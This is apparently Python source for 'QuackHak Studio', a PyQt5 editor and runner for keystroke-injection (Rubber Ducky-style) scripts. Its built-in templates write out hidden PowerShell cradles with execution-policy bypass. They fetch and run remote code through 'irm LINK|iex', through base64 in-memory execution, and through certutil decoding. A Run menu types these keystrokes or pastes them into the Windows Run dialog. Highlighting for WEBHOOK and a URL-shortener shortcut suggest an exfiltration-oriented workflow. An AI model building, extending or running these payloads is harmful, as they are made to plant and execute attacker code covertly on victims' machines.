import sys
import re
import time
from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QMenu, QFileDialog, QAction, QMessageBox, QStatusBar
from PyQt5.QtGui import QFont, QTextCharFormat, QColor, QTextCursor, QIcon, QPixmap, QKeySequence
from PyQt5.QtCore import Qt
import pyautogui
import webbrowser
import base64
import pyautogui

dark_stylesheet = """
QMainWindow, QMenuBar, QMenuBar::item, QMenu, QMenu::item {
    background-color: #444;
    color: white;
}
QMenuBar::item:selected, QMenu::item:selected {
    background-color: #555;
}
QTextEdit, QScrollBar {
    background-color: #222;
    color: white;
}
QScrollBar:horizontal {
    border: none;
    background: #222;
    height: 10px;
    margin: 0px 0px 0px 0px;
}
QScrollBar::handle:horizontal {
    background: #555;
    min-width: 20px;
}
QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {
    border: none;
    background: none;
}
QScrollBar::left-arrow:horizontal, QScrollBar::right-arrow:horizontal {
    border: none;
    background: none;
}
QScrollBar::add-page:horizontal, QScrollBar::sub-page:horizontal {
    background: none;
}
"""


def get_icon():
    encoded_image = """"""
    pixmap = QPixmap()
    pixmap.loadFromData(base64.b64decode(encoded_image))
    return QIcon(pixmap)


class CustomTextEdit(QTextEdit):
    def __init__(self, parent=None):
        super(CustomTextEdit, self).__init__(parent)
        self.setLineWrapMode(QTextEdit.NoWrap)
    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Z and event.modifiers() & Qt.ControlModifier:
            self.parent().undoAction()
            return

        if event.key() == Qt.Key_Y and event.modifiers() & Qt.ControlModifier:
            self.parent().redoAction()
            return

        if event.key() == Qt.Key_Return and event.modifiers() & Qt.ShiftModifier:
            cursor = self.textCursor()
            cursor.insertText("\n")
            return

        super().keyPressEvent(event)

        cursor = self.textCursor()
        position_before = cursor.position()

        text = self.toPlainText()

        replacements = {
            "invoke-expression": "iex",
            "invoke-restmethod": "irm",
            "invoke-webrequest": "iwr"
        }

        updated_text = text
        cursor_position_adjustment = 0
        for pattern, replacement in replacements.items():
            if pattern in updated_text.lower():
                updated_text = self.replace_insensitive(updated_text, pattern, replacement)

                cursor_position_adjustment += len(pattern) - len(replacement)

        if cursor_position_adjustment != 0:
            self.setPlainText(updated_text)

            cursor.setPosition(position_before - cursor_position_adjustment)
            self.setTextCursor(cursor)

    def cursorPositionChanged(self):
        cursor = self.textCursor()
        current_line_num = cursor.blockNumber() + 1
        total_lines = self.document().blockCount()
        self.parent().updateStatusBar(f"Line: {current_line_num}/{total_lines}")

    @staticmethod
    def replace_insensitive(text, old, new):
        idx = text.lower().index(old.lower())
        return text[:idx] + new + text[idx + len(old):]


class CodeEditor(QMainWindow):
    def __init__(self):
        super().__init__()
        self.text_edit = CustomTextEdit(self)
        self.setCentralWidget(self.text_edit)
        self.text_edit.textChanged.connect(self.colorizeText)
        self.text_edit.setFont(QFont("Consolas", 11))
        self.setWindowIcon(get_icon())
        self.initUI()
        self.current_file = None

        self.history = []
        self.redo_stack = []
        self.status_bar = QStatusBar(self)
        self.setStatusBar(self.status_bar)
        self.updateStatusBar("Line: 1")
        self.text_edit.cursorPositionChanged()

        self.text_edit.setPlainText('\n')


    def initUI(self):
        menubar = self.menuBar()
        menubar.setStyleSheet(dark_stylesheet)
        file_menu = menubar.addMenu('File')
        edit_menu = menubar.addMenu('Edit')  # New edit menu
        tools_menu, run_menu = menubar.addMenu('Tools'), menubar.addMenu('Run')

        edit_menu.addAction(QAction('Undo', self, triggered=self.undoAction, shortcut=QKeySequence.Undo))
        edit_menu.addAction(QAction('Redo', self, triggered=self.redoAction, shortcut=QKeySequence.Redo))

        tools_actions = [
            ("URL Shortener", self.openURLShortener),
            ("Github", self.openGithub)
        ]
        for name, callback in tools_actions:
            tools_menu.addAction(QAction(name, self, triggered=callback))

        new_menu = QMenu('New', self)
        new_actions = [
            ("New", self.loadFreshCode),
            ("Basic", self.loadBasicCode),
            ("Base64", self.loadBase64Code),
            ("Memory Execution", self.loadMemoryExecutionCode)
        ]
        for name, callback in new_actions:
            new_menu.addAction(QAction(name, self, triggered=callback))
        file_menu.addMenu(new_menu)

        file_actions = [
            ("Open", self.openFile),
            ("Save", self.save),
            ("Save As", self.saveAs)
        ]
        for name, callback in file_actions:
            file_menu.addAction(QAction(name, self, triggered=callback))

        run_menu.addAction(QAction('Run Script', self, triggered=self.executeScript))
        run_menu.addAction(QAction('Run AutoRun', self, triggered=self.runScript))

    def updateStatusBar(self, message):
        self.status_bar.showMessage(message)

    def undoAction(self):
        if not self.history:
            return
        self.redo_stack.append(self.text_edit.toPlainText())
        prev_state = self.history.pop()

        cursor = self.text_edit.textCursor()
        current_position = cursor.position()

        self.text_edit.textChanged.disconnect(self.colorizeText)
        self.setColoredText(prev_state)
        self.text_edit.textChanged.connect(self.colorizeText)

        cursor.setPosition(min(current_position, len(prev_state)))
        self.text_edit.setTextCursor(cursor)

    def redoAction(self):
        if not self.redo_stack:
            return
        self.history.append(self.text_edit.toPlainText())
        next_state = self.redo_stack.pop()

        cursor = self.text_edit.textCursor()
        current_position = cursor.position()

        self.text_edit.textChanged.disconnect(self.colorizeText)
        self.setColoredText(next_state)
        self.text_edit.textChanged.connect(self.colorizeText)

        cursor.setPosition(min(current_position, len(next_state)))
        self.text_edit.setTextCursor(cursor)


    def loadFreshCode(self):
        self.text_edit.clear()
        self.text_edit.insertPlainText("\n\n")
        cursor = self.text_edit.textCursor()
        cursor.movePosition(cursor.Start)
        self.text_edit.setTextCursor(cursor)

        pyautogui.press('delete')

    def executeScript(self):
        script_content = self.text_edit.toPlainText()

        if not script_content.strip():
            error_dialog = QMessageBox(self)
            error_dialog.setIcon(QMessageBox.Critical)
            error_dialog.setWindowTitle("Error")
            error_dialog.setText("The script text box is empty!")
            error_dialog.setStandardButtons(QMessageBox.Ok)
            error_dialog.exec_()
            return
        key_map = {
            "GUI r": ("hotkey", ('win', 'r')),
            "GUI x": ("hotkey", ('win', 'x')),
            "ENTER": "enter",
            "TAB": "tab",
            "ESC": "esc",
            "ALT": "alt",
            "CTRL": "ctrl",
            "SHIFT": "shift",
            "UPARROW": "up",
            "DOWNARROW": "down",
            "RIGHTARROW": "right",
            "LEFTARROW": "left",
            "HOME": "home",
            "END": "end",
            "INSERT": "insert",
            "DELETE": "delete",
            "PAGEUP": "pageup",
            "PAGEDOWN": "pagedown",
            "CAPSLOCK": "capslock",
            "NUMLOCK": "numlock",
            "SCROLLLOCK": "scrolllock",
            "SPACE": "space",
            "PRINTSCREEN": "printscreen"

        }

        for line in script_content.split('\n'):
            line = line.strip()

            if line.lower().startswith(("rem", "REM")):
                continue
            elif line.startswith("DELAY"):
                delay_time = float(line.split()[1]) / 1000
                time.sleep(delay_time)
            elif line.startswith("STRING"):
                content_to_type = line.split("STRING", 1)[1].strip()
                pyautogui.write(content_to_type)
            elif line in key_map:
                action = key_map[line]
                if isinstance(action, tuple) and action[0] == "hotkey":
                    pyautogui.hotkey(*action[1])
                else:
                    pyautogui.press(action)
            elif line in ["F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12"]:
                pyautogui.press(line.lower())

    def runScript(self):
        script_content = self.text_edit.toPlainText()
        start_index = script_content.find('powershell')
        end_index = script_content.find('ENTER')

        if 'powershell' not in script_content:
            error_dialog = QMessageBox(self)
            error_dialog.setIcon(QMessageBox.Critical)
            error_dialog.setWindowTitle("Error")
            error_dialog.setText("No PowerShell run dialog found!")
            error_dialog.setStandardButtons(QMessageBox.Ok)
            error_dialog.exec_()
            return

        if start_index != -1 and end_index != -1:
            code_to_run = script_content[start_index:end_index].strip()
            clipboard = QApplication.clipboard()
            clipboard.setText(code_to_run)
            pyautogui.hotkey('win', 'r')
            pyautogui.hotkey('ctrl', 'v')
            time.sleep(1)
            pyautogui.press('enter')

    def uppercaseKeywords(self, text):
        keywords = ['string', 'delay', 'enter', 'tab', 'rem', 'esc', 'alt', 'ctrl', 'shift', 'uparrow', 'downarrow', 'rightarrow', 'leftarrow', 'home', 'end', 'insert', 'delete', 'pageup', 'pagedown', 'capslock', 'numlock', 'scrolllock', 'space', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12', 'printscreen']
        for keyword in keywords:
            text = re.sub(r'\b' + keyword + r'\b', keyword.upper(), text)
        return text

    def openURLShortener(self):
        webbrowser.open('https://t.ly/')

    def openGithub(self):
        webbrowser.open('https://github.com/')

    def colorizeText(self):
        self.text_edit.textChanged.disconnect(self.colorizeText)

        self.history.append(self.text_edit.toPlainText())
        self.redo_stack.clear()
        self.text_edit.cursorPositionChanged()

        cursor = self.text_edit.textCursor()
        current_position = cursor.position()

        document, format = self.text_edit.document(), QTextCharFormat()
        current_text, updated_text = self.text_edit.toPlainText(), self.uppercaseKeywords(self.text_edit.toPlainText())

        if current_text != updated_text:
            self.text_edit.setPlainText(updated_text)
            cursor.setPosition(current_position)
            self.text_edit.setTextCursor(cursor)

        cursor.movePosition(QTextCursor.Start)
        color_mapping = {
            ("DELAY", "GUI", "STRING", "ENTER", "TAB", ";", "|", "ESC", "ALT", "CTRL", "UPARROW", "SHIFT", "DOWNARROW",
             "LEFTARROW", "RIGHTARROW", "HOME", "END", "INSERT", "DELETE", "PAGEUP", "PAGEDOWN", "CAPSLOCK", "NUMLOCK",
             "SCROLLLOCK", "SPACE", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12",
             "PRINTSCREEN"): "orange",
            ("irm", "iex", "iwr"): "cyan",
            ("LINK", "FUNCTION", "WEBHOOK"): "red",
            ("NoP", "W", "H", "Ep", "Bypass", "NoProfile", "WindowStyle", "Hidden", "w", "h",
             "ExecutionPolicy"): "yellow",
            "default": "white",
            "REM": "gray"
        }

        while not cursor.atEnd():
            cursor.select(QTextCursor.LineUnderCursor)
            line = cursor.selectedText()
            in_rem_mode = line.strip().upper().startswith("REM")

            is_yellow = False
            for word in re.split(r'(\W+)', line):
                if in_rem_mode:
                    format.setForeground(QColor(color_mapping["REM"]))
                else:
                    if word.startswith(" -"):
                        is_yellow = True
                    elif " " in word:
                        is_yellow = False

                    if is_yellow:
                        format.setForeground(QColor("yellow"))
                    else:
                        for words, color in color_mapping.items():
                            if word in words:
                                format.setForeground(QColor(color))
                                break
                        else:
                            format.setForeground(QColor(color_mapping["default"]))

                cursor.setCharFormat(format)
                cursor.insertText(word)

            cursor.movePosition(QTextCursor.NextBlock)


        cursor.setPosition(current_position)
        self.text_edit.setTextCursor(cursor)
        self.text_edit.textChanged.connect(self.colorizeText)

    def openFile(self):
        options = QFileDialog.ReadOnly
        file_name, _ = QFileDialog.getOpenFileName(self, "Open File", "", "Text Files (*.txt);;All Files (*)",
                                                   options=options)
        if file_name:
            with open(file_name, 'r') as file:
                self.text_edit.setPlainText(file.read())
            self.current_file = file_name

    def setColoredText(self, text):
        self.text_edit.clear()
        cursor, format = self.text_edit.textCursor(), QTextCharFormat()
        color_mapping = {
            ("DELAY", "GUI", "STRING", "ENTER", "TAB", ";", "|", "ESC", "ALT", "CTRL", "UPARROW", "SHIFT", "DOWNARROW", "LEFTARROW", "RIGHTARROW", "HOME", "END", "INSERT", "DELETE", "PAGEUP", "PAGEDOWN", "CAPSLOCK", "NUMLOCK", "SCROLLLOCK", "SPACE", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", "PRINTSCREEN"): "orange",
            ("irm", "iex", "iwr"): "cyan",
            ("LINK", "FUNCTION", "WEBHOOK"): "red",
            ("NoP", "W", "H", "Ep", "Bypass", "NoProfile", "WindowStyle", "Hidden", "w", "h",
             "ExecutionPolicy"): "yellow",
            "default": "white"
        }
        for line in text.split('\n'):
            for word in re.split(r'(\W+)', line):
                for words, color in color_mapping.items():
                    if word in words:
                        format.setForeground(QColor(color))
                        break
                else:
                    format.setForeground(QColor(color_mapping["default"]))
                cursor.setCharFormat(format)
                cursor.insertText(word)
            cursor.insertText('\n')

    def save(self):
        if self.current_file:
            with open(self.current_file, 'w') as file:
                file.write(self.text_edit.toPlainText())
        else:
            self.saveAs()

    def saveAs(self):
        options = QFileDialog.ReadOnly
        file_name, _ = QFileDialog.getSaveFileName(self, "Save File As", "", "Text Files (*.txt);;All Files (*)",
                                                   options=options)
        if file_name:
            with open(file_name, 'w') as file:
                file.write(self.text_edit.toPlainText())
            self.current_file = file_name

    def loadMemoryExecutionCode(self):
        memory_execution_code = """DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -W H -Ep Bypass &([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm LINK)))))
DELAY 500
ENTER"""
        self.setColoredText(memory_execution_code)

    def loadBasicCode(self):
        basic_code = """DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -W H -Ep Bypass irm LINK|iex;FUNCTION 
DELAY 500
ENTER"""
        self.setColoredText(basic_code)

    def loadBase64Code(self):
        base64_code = """DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -W H -Ep Bypass irm LINK -O $env:USERPROFILE\e.txt;certutil -f -decode $env:USERPROFILE\e.txt $env:USERPROFILE\d.ps1;iex $env:USERPROFILE\d.ps1
DELAY 500
ENTER"""
        self.setColoredText(base64_code)

def main():
    app = QApplication(sys.argv)
    app.setStyleSheet(dark_stylesheet)
    window = CodeEditor()
    window.setWindowTitle('QuackHak Studio')

    window.setGeometry(100, 100, 2100, 500)
    window.show()
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()
